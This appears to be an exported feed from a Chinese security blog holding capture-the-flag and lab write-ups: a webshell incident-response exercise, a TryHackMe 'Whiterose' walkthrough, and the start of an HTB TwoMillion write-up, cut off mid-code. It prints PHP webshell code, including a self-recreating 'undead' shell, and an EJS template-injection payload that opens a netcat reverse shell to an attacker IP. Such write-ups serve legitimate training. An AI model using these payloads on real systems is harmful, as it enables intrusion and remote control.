href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>进入 web 目录查找</p><p><img src="https://img.dkdun.cn/v1/2025/12/bea3ad8f80ca3f88.png"></p><p>一般来说 php 文件比较可疑，查看 <code>1.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>过滤 php 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:/var/www/html# find ./ -name <span class="hljs-string">&quot;*php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./.shell.php:&lt;?php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>])==<span class="hljs-string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;?&gt;<br>./index.php:<span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br>./1.php:&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>md5 解密</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hello&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>因为前面显示 <code>index.php</code> 文件中也有木马密码，所以查看一下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能看见通过这个文件生成了不死马</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag&#123;<span class="hljs-keyword">index</span>.php&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>在 web 目录下是有一个可疑的  <code>&#39;shell(1).elf&#39;</code> 文件，赋予权限然后运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/83dad8b4b4fba1d9.png"></p><p>虽然没有回显，但是可以再开一个终端，然后查找连接情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antpl<br><br><span class="hljs-comment"># -a：显示所有连接中的端口，包括监听和非监听。</span><br><span class="hljs-comment"># -n：以数字形式显示地址和端口号，而不是将其解析为主机名或服务名。</span><br><span class="hljs-comment"># -t：显示 TCP 连接。</span><br><span class="hljs-comment"># -p：显示使用每个套接字的程序。</span><br><span class="hljs-comment"># -l：显示监听状态的套接字。</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8aa72b85206e3564.png"></p><p>找到 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">10.11.55.21</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>同样找到端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3333</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Whiterose</title>
    <link href="/2025/03/19/THM-Whiterose/"/>
    <url>/2025/03/19/THM-Whiterose/</url>
    
    <content type="html"><![CDATA[<p>烂尾了。。。</p><span id="more"></span><h1 id="What’s-Tyrell-Wellick’s-phone-number"><a href="#What’s-Tyrell-Wellick’s-phone-number" class="headerlink" title="What’s Tyrell Wellick’s phone number?"></a>What’s Tyrell Wellick’s phone number?</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">39</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> b9:<span class="hljs-number">07</span>:<span class="hljs-number">96</span>:<span class="hljs-number">0</span>d:c4:b6:<span class="hljs-number">0</span>c:d6:<span class="hljs-number">22</span>:<span class="hljs-number">1</span>a:e4:<span class="hljs-number">6</span>c:<span class="hljs-number">8</span>e:ac:<span class="hljs-number">6</span>f:<span class="hljs-number">7</span>d (RSA)<br>|   <span class="hljs-number">256</span> ba:ff:<span class="hljs-number">92</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">0</span>f:<span class="hljs-number">03</span>:<span class="hljs-number">7</span>e:da:<span class="hljs-number">30</span>:ca:e3:<span class="hljs-number">52</span>:<span class="hljs-number">8</span>d:<span class="hljs-number">47</span>:d9:<span class="hljs-number">6</span>c (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5</span>d:e4:<span class="hljs-number">14</span>:<span class="hljs-number">39</span>:ca:<span class="hljs-number">06</span>:<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">93</span>:<span class="hljs-number">53</span>:<span class="hljs-number">86</span>:de:<span class="hljs-number">2</span>b:<span class="hljs-number">77</span>:<span class="hljs-number">09</span>:<span class="hljs-number">7</span>d (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-server-header: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Site doesn&#x27;t have a <span class="hljs-built_in">title</span> (text/html).<br>Aggressive OS guesses: Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">91</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> - <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> - <span class="hljs-number">4</span>.<span class="hljs-number">9</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">7</span> - <span class="hljs-number">3</span>.<span class="hljs-number">10</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">5</span>.<span class="hljs-number">5</span> (<span class="hljs-number">90</span>%), QNAP QTS <span class="hljs-number">4</span>.<span class="hljs-number">0</span> - <span class="hljs-number">4</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3</span>.<span class="hljs-number">4</span>) (<span class="hljs-number">89</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">3</span> hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port <span class="hljs-number">8888</span>/tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0</span>.<span class="hljs-number">34</span> ms   <span class="hljs-number">172</span>.<span class="hljs-number">30</span>.<span class="hljs-number">144</span>.<span class="hljs-number">1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">389</span>.<span class="hljs-number">62</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-number">3</span>   <span class="hljs-number">390</span>.<span class="hljs-number">09</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br><br>OS and Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">45</span>.<span class="hljs-number">53</span> seconds<br></code></pre></td></tr></table></figure><p>开放了 80，22</p><p>访问 web 网页，啥也没有</p><p><img src="https://img.dkdun.cn/v1/2025/12/faf3fe0510f50508.png"></p><p>利用 fuff 测一下有没有子域名</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw <span class="hljs-number">1</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://cyprusbank.thm/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt<br> :: Header           : Host: FUZZ.cyprusbank.thm<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response words: <span class="hljs-number">1</span><br>________________________________________________<br><br>www                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">252</span>, Words: <span class="hljs-number">19</span>, Lines: <span class="hljs-number">9</span>, Duration: <span class="hljs-number">447</span>ms]<br>admin                   [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">28</span>, Words: <span class="hljs-number">4</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">447</span>ms]<br>:: Progress: [<span class="hljs-number">4989</span>/<span class="hljs-number">4989</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">89</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span>] :: Errors: <span class="hljs-number">0</span> :<br></code></pre></td></tr></table></figure><p>有两个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.cyprusbank</span><span class="hljs-selector-class">.thm</span><br>admin<span class="hljs-selector-class">.cyprusbank</span>.thm<br></code></pre></td></tr></table></figure><p>在 <code>admin.cyprusbank.thm</code> 站点上有一个登录页面，用给出的用户密码登录进去</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Olivia</span> <span class="hljs-title class_">Cortez</span><span class="hljs-symbol">:olivi8</span><br></code></pre></td></tr></table></figure><p>可以看到一些账户信息但是看不到具体的，在 Message 页面能看到一些消息，而且可以发现 url 有 <code>?c=5</code> 这种，尝试改变页面，当 <code>?c=0</code> 时有管理员账户信息</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Gayle</span> <span class="hljs-title class_">Bev</span><span class="hljs-symbol">:p~</span>]P<span class="hljs-variable">@5</span>!<span class="hljs-number">6</span>;<span class="hljs-symbol">rs558:</span>q<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06d1a03a1b3e9912.png"></p><p>登录进去就能看到账户信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/83ba8e33fefd774e.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Tyrell</span> Wellick:<span class="hljs-number">842</span>-<span class="hljs-number">029</span>-<span class="hljs-number">5701</span><br></code></pre></td></tr></table></figure><h1 id="What-is-the-user-txt-flag"><a href="#What-is-the-user-txt-flag" class="headerlink" title="What is the user.txt flag?"></a>What is the user.txt flag?</h1><p><code>Setting</code> 栏可以修改用户账号密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/8a257a1fc4a3b305.png"></p><p>然后用 Bp 拦截，发现把 <code>password</code> 字段改了之后会回显报错</p><p><img src="https://img.dkdun.cn/v1/2025/12/801b2b1ac29262f7.png"></p><p><code>ejs</code> 报错,可以在网上搜到 CVE-2022-29078，<a href="https://xz.aliyun.com/news/11769">Ejs 模板引擎注入实现 RCE</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">name=admin&amp;password=<span class="hljs-number">111</span>&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;busybox nc <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">118</span>.<span class="hljs-number">213</span> <span class="hljs-number">1234</span> -e bash&#x27;);s<br></code></pre></td></tr></table></figure><p>监听拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">4</span>lways_upd4te_uR_d3p3nd3nc!<span class="hljs-number">3</span>s&#125;<br></code></pre></td></tr></table></figure><h1 id="What-is-the-root-txt-flag"><a href="#What-is-the-root-txt-flag" class="headerlink" title="What is the root.txt flag?"></a>What is the root.txt flag?</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> web on <span class="hljs-symbol">cyprusbank:</span><br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR</span><br><span class="hljs-string">    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>,<br>    mail_badpass<br><br><span class="hljs-title class_">User</span> web may run the following commands on <span class="hljs-symbol">cyprusbank:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm<br></code></pre></td></tr></table></figure><p>发现 <code>sudoedit</code> 可以 sudo 提权。后面的文件写不进去服了。。。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-TwoMillion</title>
    <link href="/2025/03/19/HTB-TwoMillion/"/>
    <url>/2025/03/19/HTB-TwoMillion/</url>
    
    <content type="html"><![CDATA[<p>API 越权、命令执行、CVE-2023-0386</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.221<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 21:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Did not follow redirect to http://2million.htb/<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=38870%PV=Y%DS=3%DC=T%G=Y%TM=67D8<br>OS:22FA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=2%ISR=10D%TI=Z%CI<br>OS:=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST<br>OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=<br>OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T<br>OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R<br>OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=<br>OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0<br>OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7F7%RUD=G)IE<br>OS:(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 8080/tcp)<br>HOP RTT       ADDRESS<br>1   0.28 ms   172.30.144.1<br>2   442.86 ms 10.10.16.1<br>3   442.97 ms 10.10.11.221<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 59.39 seconds<br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>f12 查看源码，找到了 <code>inviteapi.min.js</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> JavaScript <span class="hljs-built_in">file</span> loaded <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> /invite page that has <span class="hljs-built_in">to</span> <span class="hljs-built_in">do</span> <span class="hljs-keyword">with</span> invite codes?<br>:inviteapi.<span class="hljs-built_in">min</span>.js<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, d</span>) &#123;<br>    e = <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br>        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)<br>    &#125;<br>    ;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title 